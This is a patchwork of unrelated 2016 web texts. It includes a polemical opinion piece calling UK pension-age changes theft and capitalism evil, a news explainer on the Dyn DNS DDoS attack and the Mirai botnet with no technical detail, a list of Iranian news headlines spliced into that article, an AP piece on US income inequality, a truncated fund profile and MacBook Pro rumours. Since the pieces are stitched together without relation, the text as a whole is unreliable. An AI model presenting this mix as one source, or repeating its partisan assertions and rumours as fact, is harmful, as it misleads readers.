It suggested that today’s pensioners are to blame, which is partly true, but Channel Four didn’t explain why. Every British woman younger than 60 or so has had at least £30,000 stolen from her by the simple trick of suddenly moving the state pension age. Men have been robbed too, but not quite as much. This amounts to a total theft of hundreds of billions of pounds, money which many people are fully entitled to, right now, having paid National Insurance for decades in the belief they could retire at age 60, and 65 for men. Banks are properly penalised for mis-selling insurance, but their offence pails to insignificance compared with government mis-selling of National Insurance. The Dispatches documentary was by Fraser Nelson, editor of the Spectator, a magazine that peddles far-right propaganda. It suggested that today’s wealth gap is somehow the fault of pensioners, but said nothing about how much is being stolen from pensioners by the state. Today’s wealth gap is not because of rich pensioners (the state pension is less than half the National Minimum Wage, and only a third of the UK Living Wage), it’s because most pensioners have spent the last 40 years mistakenly voting for far-right politicians - in one guise or another. Capitalism, the economic dogma of the far-right, is the reason the young have mountains of student debt, unemployment, no affordable housing, deteriorating health care, environmental catastrophe and endless illegal wars. Capitalism is evil. That’s the best word for it. Andy Grove, multimillionaire CEO of Intel accurately described capitalism’s purpose as “shooting the wounded.” If the young want to enjoy better lives, as they easily could, and if they want to re-create a decent society for their children to inherit, they’re going to have to get rid of capitalism-loving politicians and make sure they never come to power again. Socialism isn’t perfect, but it offers the young and the old much more than capitalism. The young must get political, they need to learn about, and start voting for, socialism; and the old need to realise how they and their children have been stitched-up by the very people most of the old were tricked into voting for over the last four decades.

An attack on a major DNS service provider literally broke the internet Friday, impacting more than 80 popular websites, including PayPal, Reddit and Twitter. Here’s how a group of hackers is suspected to have pulled off the takedown. A myriad of websites were unavailable Friday as three separate distributed denial of service (DDoS) attacks on a major internet server blocked service to heavily trafficked websites such as Pinterest, Spotify and the New York Times. The first attack on the New Hampshire-based server occurred Friday morning, but Dyn DNS Company managed to resolve the issue within a few hours. However, a second attack began in the early afternoon followed by a third. It was not until 6:30 p.m. Eastern Time that all had been resolved. How did a series of cyber-attacks manage to bring large swathes of the internet to its knees? To understand why everyone’s favorite sites were unavailable Friday, it’s important to understand the nature of a Domain Name Server (DNS). Imagine a DNS as a telephone operator from the 1950s. By typing in a website’s name, you are asking the DNS to connect you to a specific server. When an army made up of botnets uses Wi-Fi routers, computers and other devices connected to the internet to create a network that can operate malware without the owner’s knowledge, they overwhelm a DNS server with requests that appear to be normal, so a system like Dyn’s struggles to filter them out. “They're tough attacks to stop because they often get channeled through recursive providers. They're not cacheable because of the random prefix,” Matthew Prince, co-founder and CEO of the content delivery and DDoS protection service provider CloudFlare explained to Ars Technica. When they generate requests, they attach random text to the front of domain names – which is how they appear to be unique requests. These requests pour in by the tens of millions. Like any operator receiving millions of requests at once, Dyn’s DNS broke down. Another part of the issue is the kind of malware used in the attack. Internet of Things devices were targeted and that covers anything with an internet connection. This includes everything from a standard computer to cellphones to Google Home to video cameras. In fact, the Prodigo Espresso maker relies on Internet of Things (IoT) technology. Therefore, a fancy coffee maker could have been partially responsible for putting a pause on Spotify. It certainly doesn’t help that the source code for a vicious type of malware was released on the dark web earlier this month. Known as Mirai, it spreads to IoT devices by scanning the internet for vulnerable devices that are seeded with malicious software. Once that software is in, an Espresso maker or other IoT appliance can become a central control server for a DDoS attack, according to Krebs on Security. Is this a hack? Not exactly. While some companies that handle money transfers, such as PayPal and Amazon, were affected, there is currently no evidence that any information was breached. PayPal told Reuters that its networks had not been hacked. Who’s behind these attacks? This is a good question that many are scrambling to answer. New World Hackers has claimed responsibility for the attack, according to activist and web consultant Gissur Simonarson. The shadowy group has prided themselves on their DDoS attacks, such as one that took the BBC’s website down last year. In an interview with Anon Intel Group, a representative of New World Hackers claimed the attack was “an annual power test,” and “this is actually against Russia. Testing power is the key. Like that we see how much bandwidth each attack outputs…” They claim that Friday’s attack was something of a warning shot to Russian hackers, saying: “Russia is pretty much saying they are better than the US by hacking into everything, attempting to start a war. We will show them a war.” The attacks came from all around the world, and both the FBI and Department of Homeland Security have said they were investigating, Reuters reported. The member of New World Hackers told Anon Intel: “We don’t want federal agents on our ass. That’s why we are in Russia.” WikiLeaks claimed its supporters were involved, tweeting out, “We ask supporters to stop taking down the US internet. You proved your point.” If New World Hackers is indeed behind the attack, then it was unlikely to have been in the name of aiding WikiLeaks. The Twitter account for New World Hackers told Simonarson: “WikiLeaks and Russia are kind of iffy. Sometimes we are friends, sometimes not. Overall, we are just against Russia because they are against the US.” Is this a one-off occurrence? There’s no way to predict the future, but it is safe to assume that this will happen again. While this is the largest attack, if New World Hackers makes good on their promises to attack other countries it will likely happen again.         LATEST STORIES (10) American Students Join Anti-Trump Protests across US Eleven Killed, Wounded in Terrorists' Rocket Attack in Western Damascus Samples Taken in Syria's Aleppo Prove Militants Used Chlorine Gas Syrian Army Discovers Terrorists' 700-Meter-Long Tunnel in Khan Al-Sheih Connecting Damascus to Quneitra Protests, Students Walkouts Mark Week after Trump's Win Yemen Water Crisis Iraqi Popular Forces Continue Operations against ISIL Terrorists West of Mosul Iraqi Forces Take Back Ancient City of Nimrud from ISIL Iraqi Popular Forces Safeguarding Peace in Newly Gained Territories near Mosul Police Violence during Anti-Trump Protests Iran and US: A Tale of Two Elections Supermoon in Iran's Sky Iran Eyeing NITC Listing in Int'l Stock Markets VP: World Admitting Iran's Constructive Role in Maintaining Regional Security Iraqi Interior Minister: Nearly 1,000 ISIL Terrorists Killed, Over 100 Captured in Mosul Operation American Students Join Anti-Trump Protests across US TEHRAN (FNA)- Protesters were not slowing down six days after Donald Trump's election, many of them high school students leaving class by the hundreds to carry signs and flags on the streets of several US cities.

WHY IT MATTERS: Income inequality World by Josh Boak, The Associated Press Posted Oct 21, 2016 11:17 pm MST Last Updated Oct 22, 2016 at 12:00 am MST WASHINGTON – THE ISSUE: The rich keep getting richer while more Americans are getting left behind financially. Income inequality has surged near levels last seen before the Great Depression. The average income for the top 1 per cent of households climbed 7.7 per cent last year to $1.36 million, according to tax data tracked by Emmanuel Saez, an economics professor at the University of California, Berkeley. That privileged sliver of the population saw pay climb at almost twice the rate of income growth for the other 99 per cent, whose pay averaged a humble $48,768. But why care how much the wealthy are making? What counts the most to any family is how much that family is bringing in. And that goes to the heart of the income-inequality debate: Most Americans still have yet to recover from the Great Recession, even though that downturn ended seven years ago. The average income for the 99 per cent is still lower than it was back in 1998 after adjusting for inflation. Meanwhile, incomes for the executives, bankers, hedge fund managers, entertainers and doctors who make up the top 1 per cent have steadily improved. These one-percenters account for roughly 22 per cent of all personal income, more than double the post-World War II era level of roughly 10 per cent. One reason the income disparity is troubling for the nation is that it’s thinning out the ranks of the middle class. ___ WHERE THEY STAND Hillary Clinton has highlighted inequality in multiple speeches, with her positions evolving somewhat over the past year. Bernie Sanders held her feet to the fire on that subject in the primaries. Clinton hopes to redirect more money to the middle class and impoverished. Clinton would raise taxes on the wealthy, increase the federal minimum wage, boost infrastructure spending, provide universal pre-K and offer the prospect of tuition-free college. Donald Trump offers a blunter message about a hollowed-out middle class and a system “rigged” against average Americans. Still, he has yet to emphasize income inequality in the campaign. To bring back the factory jobs long associated with the rise of the middle class, Trump has promised new trade deals and infrastructure spending. But Trump has also proposed a tax plan that would allow the wealthiest Americans to keep more of their earnings. ___ WHY IT MATTERS President Barack Obama has called rising inequality “the defining challenge of our time.” And experts warn that it may be slowing overall economic growth. Greater inequality has created a festering distrust of government and of corporate leaders whose promises of better times ahead never fully materialized. The result has been a backlash against globalization that many Americans feel tilted the economy against them. For the top 1 per cent, the ability to move money overseas and reach markets worldwide concentrated pay for “superstars,” according to economists. At the same time, factory workers now compete with 3 billion people in China, India, Eastern Europe and elsewhere who weren’t working for multinational corporations 20 years ago. Many now make products for Apple, Intel, General Motors and others at low wages. This has depressed middle-class pay. These trends have contributed to a “hollowed out” labour market in the United States, with more jobs at the higher and lower ends of the pay scale and fewer in the middle. Social factors have amplified the trend as well. Single-parent families are more likely to be poor than other families and less likely to ascend the income ladder. Finally, men and women with college degrees and high pay are more likely to marry each other and amplify income gaps. ___ This story is part of AP’s “Why It Matters” series, examining three dozen issues at stake in the presidential election.

By Sarah Max Biography Updated Oct. 22, 2016 1:50 a.m. ET If Hollywood were to tell the story of the AB Global Bond fund, the synopsis might go something like this: A kid from Staten Island pays his way through college by working on the docks and driving an 18-wheeler. He studies information technology, thinking it’s a sure way to get a job in the late 1990s, and ends up analyzing risk for a large Wall Street firm. He works in relative obscurity until one day, a star portfolio manager, who’s just a few years older, but took a more traditional route to Wall Street, takes notice....

The variants are expected to sport a much slimmer design compared to its predecessors. Rumours suggest that the MacBook Pro 2016 will have a larger Trackpad and a butterfly keyboard design. Apple is holding a press event on Oct. 27 at its Cupertino campus. The invites have been sent though it does not reveal anything about the MacBook Pro 2016. Fans expect the MacBook Pro line-up to be the centre of discussion when the event begins. Apple has reportedly made massive upgrades to the line-up in terms of both specs and design. A fully-customizable OLED touchscreen toolbar is rumoured to feature in the MacBook Pro 2016 that has replaced the F keys. The keyboard will reportedly change the keys displayed as per the app running on the computer and even change into a download progress bar. Touch ID feature is set to provide added security to the MacBook Pro 2016. This feature is already present in the iPhone models. The Touch ID is set to be incorporated into the “Power” button so that when a user presses the button it will result in automatic user verification via fingerprint scan, writes Tech Times. As per BGR, the Apple MacBook Pro 2016 is most-likely to boast Intel’s Skylake chipset and AMD Polaris graphics processor. The device may run on the MacOS Sierra that itself is a powerhouse of incredible features. The standard USB ports could be replaced by the much-talked-about USB-C ports and Thunderbolt 3. The Apple MacBook Pro has not received any major overhaul since 2012. It will also bring with it Apple's Siri voice-activated assistant and loads of other exciting features. Recently, a Reddit post appeared showing a prototype of the Apple e-ink keyboard being developed by Sonder. The post has been taken down. Apple has a reputation of taking big leaps that are first criticised but later become the new standard. A similar thing happened with the 3.5mm headphone jack that was dropped from the iPhone 7 and iPhone 7 Plus devices. Stay tuned on IBT AU for more updates on Apple MacBook Pro 2016.
